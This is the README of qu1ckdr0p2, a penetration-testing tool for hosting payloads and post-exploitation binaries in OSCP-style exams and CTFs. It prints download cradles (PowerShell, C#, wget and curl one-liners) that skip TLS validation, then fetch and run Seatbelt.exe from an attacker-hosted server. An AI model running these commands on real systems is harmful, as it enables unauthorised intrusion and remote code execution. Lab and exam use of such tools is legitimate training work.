
<h1 align="center">
    <img src="img/quick_drop_small.png"</img>
</h1>

<h4 align="center">Rapidly host payloads and post-exploitation bins over http or https.</h4>
<h6 align="center">Designed to be used on exams like OSCP / PNPT or CTFs HTB / etc.</h4>
<h6 align="center">Pull requests and issues welcome. As are any contributions.</h4>

<p align="center">
  <a href="#install">Install</a> •
  <a href="#install">About</a> •
  <a href="#examples">Examples</a> •
  <a href="#license">License</a>
</p>

## About
Qu1ckdr0p2 comes with an alias and search feature and many tools located in the https://github.com/byinarie/qu1ckdr0p2-tools repository. 

By default it will generate a self-signed TLS cerficiate to use when using the `--https` option, priory is also given to the `tun0` interface when the webserver is running, otherwise it will use `eth0`.

The common.ini https://github.com/byinarie/qu1ckdr0p2-tools/blob/main/config/common.ini contains the mapped aliases used within the `--search and -u` options.

I eventually plan on including a pipeline for handling updates to the included tools but as of now its not implemented.

When the webserver is running there are several download cradles printed to the screen to copy and paste.

## Install
```zsh
pip3 install qu1ckdr0p2
serv init --update
```

## Basic usage
### Serv a single file located in your current working directory
```zsh
serv --help
serv init --update
serv serve -f implant.bin --https 443
serv serve -f file.example --http 8080
```

### Serv a file from a mapped alias
The mapped alias numbers for the `-u` option are dynamic so you don't have to remember specific numbers or ever type out a tool name.
```zsh
$ serv serve --search seatbelt
[→] Path: ~/.qu1ckdr0p2/windows/Seatbelt.exe
[→] Alias: seatbelt
[→] Use: 1

[→] Path: ~/.qu1ckdr0p2/windows/NetFramework_4.0_Any/Seatbelt.exe
[→] Alias: seatbelt_net40_any
[→] Use: 2

[→] Path: ~/.qu1ckdr0p2/windows/NetFramework_4.0_x64/Seatbelt.exe
[→] Alias: seatbelt_net40_x64
[→] Use: 3

[→] Path: ~/.qu1ckdr0p2/windows/NetFramework_4.0_x86/Seatbelt.exe
[→] Alias: seatbelt_net40_x86
[→] Use: 4

(...)

$ serv serve --search seatbelt -u 2
[→] Serving: ../../../.qu1ckdr0p2/windows/NetFramework_4.0_Any/Seatbelt.exe
[→] Protocol: https
[→] IP address: 192.168.1.5
[→] Port: 443
[→] Interface: eth0
[→] Using cert: /home/byinarie/.qu1ckdr0p2/certs/cert.pem
[→] Using key: /home/byinarie/.qu1ckdr0p2/certs/key.pem
[→] CTRL+C to quit

[→] URL: https://192.168.1.5:443/Seatbelt.exe

[↓] csharp_ignore_tls:
Add-Type -TypeDefinition "using System.Net;using System.Security.Cryptography.X509Certificates;public class SSLValidator {public static void Ignore() {ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;}}" -Language CSharp; [SSLValidator]::Ignore(); $webclient = New-Object System.Net.WebClient; $webclient.DownloadFile('https://192.168.1.5:443/Seatbelt.exe', 'c:\windows\temp\Seatbelt.exe');Start-Process 'c:\windows\temp\Seatbelt.exe'

[↓] wget_ignore_tls:
wget --no-check-certificate https://192.168.1.5:443/Seatbelt.exe -O /tmp/Seatbelt.exe && chmod +x /tmp/Seatbelt.exe && /tmp/Seatbelt.exe

[↓] curl_ignore_tls:
curl -k https://192.168.1.5:443/Seatbelt.exe -o /tmp/Seatbelt.exe && chmod +x /tmp/Seatbelt.exe && /tmp/Seatbelt.exe

[↓] powershell_ignore_tls:
$AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'; [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols; $WebClient = New-Object System.Net.WebClient; $WebClient.DownloadFile('https://192.168.1.5:443/Seatbelt.exe', 'c:\windows\temp\Seatbelt.exe'); Start-Process 'c:\windows\temp\Seatbelt.exe'
```




## License

MIT

---

